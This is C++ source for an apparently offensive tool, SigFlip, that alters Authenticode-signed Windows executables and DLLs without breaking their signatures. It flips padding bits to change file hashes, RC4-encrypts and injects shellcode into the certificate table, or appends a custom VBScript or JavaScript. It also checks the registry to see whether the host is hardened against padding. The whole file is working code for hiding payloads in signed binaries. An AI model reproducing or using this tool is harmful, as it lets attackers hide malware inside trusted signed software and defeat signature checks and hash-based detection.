#include "pch.h"
#include "SigFlip.h"
#include "Helper.h"

#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Softpub.h>
#include <wincrypt.h>
#include <wintrust.h>

#pragma comment (lib, "wintrust")


int main(INT argc, CHAR* argv[]) {

	//Parsing arguments
	if (!(argc == 4 || argc == 5 || argc == 6)) {
		usage(argv[0]);
	}

	CHAR _fPath[MAX_PATH_LENGTH] = {};
	CHAR _sPath[MAX_PATH_LENGTH] = {};
	CHAR _oPath[MAX_PATH_LENGTH] = {};
	CHAR _cPath[MAX_PATH_LENGTH] = {};
	LPWSTR _fwPath = NULL;
	LPWSTR _owPath = NULL;
	CHAR* _key = NULL;
	DWORD _keySize = 0;


	MODE _mode = BIT_FLIP;
	SIZE_T _ind = 1;

	switch (argv[_ind][1]) {   
	case 'b': _mode = BIT_FLIP; break;
	case 'i': _mode = INJECT; break;
	case 'c': _mode = CUSTOM_SCRIPT; break;
	case 'h': usage(argv[0]); break;
	default:
		usage(argv[0]);
	}

	printf("\n");

	// Added
	if (_mode == CUSTOM_SCRIPT) {
		memcpy_s(&_fPath, MAX_PATH_LENGTH, argv[_ind + 1], MAX_PATH_LENGTH);
		memcpy_s(&_cPath, MAX_PATH_LENGTH, argv[_ind + 2], MAX_PATH_LENGTH);
		memcpy_s(&_oPath, MAX_PATH_LENGTH, argv[_ind + 3], MAX_PATH_LENGTH);
	} // -------
	else if (_mode == BIT_FLIP) {
		memcpy_s(&_fPath, MAX_PATH_LENGTH, argv[_ind + 1], MAX_PATH_LENGTH);
		memcpy_s(&_oPath, MAX_PATH_LENGTH, argv[_ind + 2], MAX_PATH_LENGTH);
	}
	else {
		if (argc == 5 || argc == 6) {
			memcpy_s(&_fPath, MAX_PATH_LENGTH, argv[_ind + 1], MAX_PATH_LENGTH);
			memcpy_s(&_sPath, MAX_PATH_LENGTH, argv[_ind + 2], MAX_PATH_LENGTH);
			memcpy_s(&_oPath, MAX_PATH_LENGTH, argv[_ind + 3], MAX_PATH_LENGTH);
			if (argc == 6) {
				_keySize = strlen(argv[_ind + 4]);
				_key = (CHAR*)malloc((_keySize + 1) * sizeof(CHAR));
				memcpy_s(_key, _keySize, argv[_ind + 4], _keySize);
			}
		}
		else {
			usage(argv[0]);
		}
	}

	//check config
	if (checkConfig()) {
		fprintf(stderr, "[!]: Endpoint hardened against authenticode signature padding, i.e this won't work %s\n", _fPath);
		exit(EXIT_FAILURE);
	}

	PIMAGE_DOS_HEADER _dosHeader = {};
	PIMAGE_NT_HEADERS _ntHeader = {};
	IMAGE_OPTIONAL_HEADER _optHeader = {};
	DWORD _CertTableRVA = 0;
	SIZE_T _CertTableSize = 0;
	LPWIN_CERTIFICATE _wCert = {};
	DWORD checksum = 0;
	FILE* _outFile = NULL;
	SIZE_T _writtenBytes = 0;
	CHAR* _data = NULL;
	DWORD _dataSize = 0;
	CHAR* _encryptedData = NULL;
	CHAR* _rpadding = NULL;
	DWORD _fSize = 0;
	VOID* _peBlob = NULL;
	DWORD  _bytesRead = 0;
	HANDLE _fHandle = INVALID_HANDLE_VALUE;
	HANDLE _oHandle = INVALID_HANDLE_VALUE;
	HANDLE _fDataHandle = INVALID_HANDLE_VALUE;
	DWORD _extraPaddingCount = 0;
	CHAR* _extraPadding = NULL;
	DWORD _DT_SecEntry_Offset = 0;
	CHAR* _sha1Hash = NULL;

	//Loading PE File
	printf("[*]:Loading/Parsing PE File '%s'\n\n", _fPath);
	_fHandle = CreateFileA(_fPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!]: Could not read file %s\n", _fPath);
		exit(EXIT_FAILURE);
	}

	//Verifying PE file signature
	toMultiByte(strlen(_fPath), _fPath, _fwPath);
	if (VerifyPESignature(_fwPath, _fHandle) == 0) {
		printf("[*]:PE File '%s' is SIGNED\n", _fPath);
	}
	else {
		printf("[*]:PE File '%s' is NOT SIGNED\n", _fPath);
	}

	//Reading PE file
	_fSize = GetFileSize(_fHandle, NULL);

	// Added

	if (_mode == CUSTOM_SCRIPT) {
		_rpadding = getCustomScript(_cPath);
		_fSize += strlen(_rpadding);
	}
	else {
		_rpadding = genRandomBytes(8);
		_mode == BIT_FLIP ? _fSize += strlen(_rpadding) : _fSize = _fSize;
	}
	// -------

	_peBlob = malloc(_fSize);
	ReadFile(_fHandle, _peBlob, _fSize, &_bytesRead, NULL);


	if (_bytesRead == 0) {
		fprintf(stderr, "[!]: Could not read file %s\n", _fPath);
		goto _Exit;
	}

	_dosHeader = (PIMAGE_DOS_HEADER)_peBlob;

	if (_dosHeader->e_magic != 0x5a4d) {
		fprintf(stderr, "'%s' is not a valid PE file\n", _fPath);
		goto _Exit;
	}

	//Compute Sha1 hash
	_sha1Hash = (char*)malloc(((SHA1LEN * 2) + 1) * sizeof(char));
	if (Sha1((BYTE*)_peBlob, _sha1Hash, GetFileSize(_fHandle, NULL))) {
		printf("[+]:Current PE File '%s' SHA1 Hash is : %s\n", _fPath, _sha1Hash);
	}
	else {
		printf("[!]:Could not compute PE '%s' SHA1 Hash\n", _fPath);
		free(_sha1Hash);
	}


	//Get "e_lfanew" offset (pointing to the PE FILE HEADER -> IMAGE_NT_HEADERS)
	_ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);

	//Get IMAGE_OPTIONAL_HEADER from IMAGE_NT_HEADERS
	_optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;

	//Security entry seems to be located at the 7th offset (Data_Dir) for For x64 PE files, and the 5th offset for x86 PE files. just a quick workaround to make the script work for different PE archs.
	if (IsWow64(GetCurrentProcess())) {
		if (_optHeader.Magic == 0x20B) {
			_DT_SecEntry_Offset = 2;
		}
	}
	else {
		if (_optHeader.Magic == 0x10B) {
			_DT_SecEntry_Offset = -2;
		}
	}

	//Get IMAGE_DIRECTORY_ENTRY_SECURITY field and retrieve the RVA and SIZE of the Certificate Table (WIN_CERTIFICATE).
	_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
	_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
	_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);

	printf("%s", getFName(_fPath));
	printf("%s", getFName(_oPath));

	// Appending custom script
	if (_mode == CUSTOM_SCRIPT) {
		printf("%s", getFName(_cPath));
		printf("[+]:Appending custom script to File '%s'\n", _fPath);

		printf("[+]:Padding '%s' with %s of size %ld \n", _fPath, _rpadding, strlen(_rpadding));
		//Add padding based on data read from _sPath.
		memcpy((((BYTE*)_peBlob + _CertTableRVA) + _wCert->dwLength), _rpadding, strlen(_rpadding));

		//update dwLength and Cert Table Entry Size.
		printf("[+]:Updating OPT Header Fields/Entries \n");
		_wCert->dwLength += strlen(_rpadding);
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size += strlen(_rpadding);

		//update checksum
		printf("[+]:Calculating/Updating the new OPTHeader checksum\n");
		checksum = PEChecksum(_peBlob, _fSize);
		_ntHeader->OptionalHeader.CheckSum = checksum;

		//re-computing the new sha1 hash
		_sha1Hash = (char*)malloc(((SHA1LEN * 2) + 1) * sizeof(char));
		if (Sha1((BYTE*)_peBlob, _sha1Hash, _fSize)) {
			printf("[+]:New PE File '%s' SHA1 Hash is : %s\n", _oPath, _sha1Hash);
		}
		else {
			printf("[!]:Could not compute PE '%s' SHA1 Hash\n", _oPath);
			free(_sha1Hash);
		}

		//save patched PE to disk
		printf("[+]:Saving modified PE to '%s'\n", _oPath);
		_outFile = fopen(_oPath, "wb");
		_writtenBytes = fwrite(_peBlob, _fSize, 1, _outFile);
		fclose(_outFile);
	}
	//Bit Flip and Save file to disk
	else if (_mode == BIT_FLIP) {
		printf("[+]:Bit Flipping PE File '%s'\n", _fPath);

		printf("[+]:Padding '%s' with %s of size %d \n", _fPath, _rpadding, strlen(_rpadding));
		//Add padding based on data read from _sPath.
		memcpy((((BYTE*)_peBlob + _CertTableRVA) + _wCert->dwLength), _rpadding, strlen(_rpadding));

		//update dwLength and Cert Table Entry Size.
		printf("[+]:Updating OPT Header Fields/Entries \n");
		_wCert->dwLength += strlen(_rpadding);
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size += strlen(_rpadding);

		//update checksum
		printf("[+]:Calculating/Updating the new OPTHeader checksum\n");
		checksum = PEChecksum(_peBlob, _fSize);
		_ntHeader->OptionalHeader.CheckSum = checksum;

		//re-computing the new sha1 hash
		_sha1Hash = (char*)malloc(((SHA1LEN * 2) + 1) * sizeof(char));
		if (Sha1((BYTE*)_peBlob, _sha1Hash, _fSize)) {
			printf("[+]:New PE File '%s' SHA1 Hash is : %s\n", _oPath, _sha1Hash);
		}
		else {
			printf("[!]:Could not compute PE '%s' SHA1 Hash\n", _oPath);
			free(_sha1Hash);
		}

		//save patched PE to disk
		printf("[+]:Saving Bit-flipped PE to '%s'\n", _oPath);
		_outFile = fopen(_oPath, "wb");
		_writtenBytes = fwrite(_peBlob, _fSize, 1, _outFile);
		fclose(_outFile);
	}


	//Inject Data and Save file to disk
	else if (_mode == INJECT) {

		printf("[+]:Injecting Data (sh311code) from '%s' to PE File '%s'\n", _sPath, _fPath);
		_fDataHandle = CreateFileA(_sPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (_fDataHandle == INVALID_HANDLE_VALUE) {
			fprintf(stderr, "[!]: Could not read data file %s\n", _sPath);
			goto _Exit;
		}

		_bytesRead = 0;
		_dataSize = GetFileSize(_fDataHandle, NULL);
		_data = (char*)malloc(_dataSize);
		ReadFile(_fDataHandle, _data, _dataSize, &_bytesRead, NULL);

		if (_bytesRead == 0) {
			fprintf(stderr, "[!]: Empty data file %s\n", _sPath);
			goto _Exit;
		}


		//RC4 encrypt and Tag
		printf("[+]:Encrypting/Encoding Data with size %d\n", _dataSize);
		_encryptedData = (CHAR*)malloc(_dataSize + 8);
		if (_keySize == 0) {
			_key = genKey();
			_keySize = 15;
		}
		memcpy(_encryptedData, "\xFE\xED\xFA\xCE\xFE\xED\xFA\xCE", 8);
		crypt((unsigned char*)_data, _dataSize, _key, _keySize, (unsigned char*)_encryptedData + 8);
		_dataSize += 8;

		//Adjust extra padding
		if ((_fSize + _dataSize) % 8 != 0) {
			while ((_fSize + _dataSize + _extraPaddingCount) % 8 != 0) {
				_extraPaddingCount++;
			}
			_extraPadding = (char*)malloc(_extraPaddingCount + 1);
			sprintf(_extraPadding, "%0*d", _extraPaddingCount, 0);
			_encryptedData = (CHAR*)realloc(_encryptedData, (_dataSize + _extraPaddingCount));
			memcpy(_encryptedData + _dataSize, _extraPadding, _extraPaddingCount);
			_dataSize += _extraPaddingCount;
		}

		//Increasing buffer size
		_peBlob = realloc(_peBlob, (_fSize + _dataSize));

		//Re-initialize structures (_peBlob was reallocated)
		_dosHeader = {};
		_ntHeader = {};
		_wCert = {};
		_dosHeader = (PIMAGE_DOS_HEADER)_peBlob;
		_ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);
		_optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;
		_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
		_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
		_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);

		//Add padding based on data read from _sPath
		memcpy((((BYTE*)_peBlob + _CertTableRVA) + _wCert->dwLength), _encryptedData, _dataSize);

		//update dwLength and Cert Table Entry Size.
		printf("[+]:Updating OPT Header Fields/Entries \n");
		_wCert->dwLength += _dataSize;
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size += _dataSize;

		//update checksum
		printf("[+]:Calculating/Updating the new OPTHeader checksum\n");
		checksum = PEChecksum(_peBlob, _fSize + _dataSize);
		_ntHeader->OptionalHeader.CheckSum = checksum;


		printf("[+]:Encrypted Data Size: %d\n", _dataSize);
		printf("[+]:Extra Padding: %d\n", _extraPaddingCount);
		printf("[+]:Encryption Key: %s\n", _key);

		//re-computing the new sha1 hash
		_sha1Hash = (char*)malloc(((SHA1LEN * 2) + 1) * sizeof(char));
		if (Sha1((BYTE*)_peBlob, _sha1Hash, (_fSize + _dataSize))) {
			printf("[+]:PE File '%s' SHA1 Hash is : %s\n", _oPath, _sha1Hash);
		}
		else {
			printf("[!]:Could not compute PE '%s' SHA1 Hash\n", _oPath);
			free(_sha1Hash);
		}

		//save patched PE to disk
		printf("[+]:Saving Modified PE file to '%s'\n", _oPath);
		_outFile = fopen(_oPath, "wb");
		_writtenBytes = fwrite(_peBlob, (_fSize + _dataSize), 1, _outFile);
		fclose(_outFile);
	}


	//verify modified PE file signature
	_oHandle = CreateFileA(_oPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!]: Could not read file %s\n", _oPath);
		exit(EXIT_FAILURE);
	}
	toMultiByte(strlen(_oPath), _oPath, _owPath);
	if (VerifyPESignature(_owPath, _oHandle) == 0) {
		printf("[*]:Modified PE File '%s' is SIGNED (Success)\n", _oPath);
	}
	else {
		printf("[!]:Modified PE File '%s' is NOT SIGNED (FAILURE)\n", _oPath);
	}

	printf("\n[*]:Done\n");


_Exit:
	if (_data) free(_data);
	if (_encryptedData) free(_encryptedData);
	if (_extraPadding) free(_extraPadding);
	if (_peBlob) free(_peBlob);
	if (_sha1Hash) free(_sha1Hash);
	if (_fwPath) free(_fwPath);
	if (_owPath) free(_owPath);
	if (_key) free(_key);
	CloseHandle(_fHandle);
	CloseHandle(_fDataHandle);
	exit(EXIT_SUCCESS);
}

BOOL checkConfig() {

	HKEY _hKey;
	LONG _nResult;
	BOOL _check = FALSE;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"\Software\Wow6432Node\Microsoft\Cryptography\Wintrust\Config",
		0, KEY_READ, &_hKey) == ERROR_SUCCESS || RegOpenKeyEx(HKEY_LOCAL_MACHINE,
			L"\Software\Microsoft\Cryptography\Wintrust\Config", 0, KEY_READ, &_hKey) == ERROR_SUCCESS) {

		DWORD dwType;
		_nResult = RegQueryValueEx(_hKey, L"EnableCertPaddingCheck", NULL, &dwType, NULL, NULL);
		if (_nResult == ERROR_SUCCESS)
			_check = TRUE;
		RegCloseKey(_hKey);
	}

	return _check;
}

void usage(char* _file) {
	fprintf(stderr, "\nUsage: \n\n    [+] Bit Flipping: %s -b [exe/dll file path] [output_file_path (with extension)]\n\n    [+] Inject Shellcode: %s -i [exe/dll file path] [shellcode file path] [output_file_path (with extension)] [Encryption Key]\n", _file, _file);
	fprintf(stdout, "\n    [+] Append custom script (VBSrcipt or Javascript): %s -c [dll file path] [custom script file path] [output_file_path (with extension)]\n", _file);
	exit(EXIT_FAILURE);
}
